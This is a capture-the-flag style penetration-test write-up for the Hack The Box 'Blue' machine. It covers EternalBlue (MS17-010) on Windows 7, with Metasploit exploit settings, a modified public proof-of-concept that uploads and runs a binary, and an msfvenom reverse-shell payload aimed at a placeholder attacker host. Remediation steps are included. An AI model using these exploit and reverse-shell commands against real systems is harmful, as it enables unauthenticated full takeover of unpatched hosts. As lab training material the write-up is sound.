# Penetration Test Report — Blue

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Focus](https://img.shields.io/badge/focus-EternalBlue%20MS17--010-red)

## Executive Summary

An authorized assessment of `target.htb` identified a Windows 7 SP1 host vulnerable to **EternalBlue (MS17-010)** — the SMBv1 exploit leaked in 2017 and later weaponized by WannaCry and NotPetya. Exploitation granted immediate `NT AUTHORITY\SYSTEM` access. No privilege escalation was required; the host was fully compromised in a single step.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | SMBv1 vulnerable to MS17-010 (EternalBlue) — unauthenticated RCE | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
nmap -sC -sV target.htb
```

SMB open among other services. Version identification via Metasploit:

```
use auxiliary/scanner/smb/smb_version
set RHOSTS target.htb
run
# Windows 7 Professional SP1
```

Windows 7 SP1 with SMBv1 is a prime EternalBlue candidate.

### 2. Exploitation

Metasploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.htb
set LHOST <attacker-ip>
run
```

Immediate SYSTEM shell. Flags: `C:\Users\haris\Desktop\user.txt.txt` and `C:\Users\Administrator\Desktop\root.txt.txt`.

### 3. Manual Exploitation (Optional)

Using the [worawit/MS17-010](https://github.com/worawit/MS17-010) PoC — `zzz_exploit.py` was modified so `smb_pwn` uploads and executes a local binary:

```python
smb_send_file(smbConn, '/root/writeup.exe', 'C', '/writeup.exe')
service_exec(conn, r'cmd /c c:\writeup.exe')
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > writeup.exe
./zzz_exploit.py target.htb ntsvcs   # named pipe required; may take several attempts
```

(Empty username `\` works against the default configuration.)

## Remediation

- **Apply MS17-010** and disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`).
- Retire Windows 7/2008 from any network segment; isolate legacy systems that cannot be patched.
- Block SMB (445) at network boundaries; enable host firewalls.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access / Execution | T1210 — Exploitation of Remote Services (SMB) |
| Lateral Movement | T1021.002 — SMB/Windows Admin Shares |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
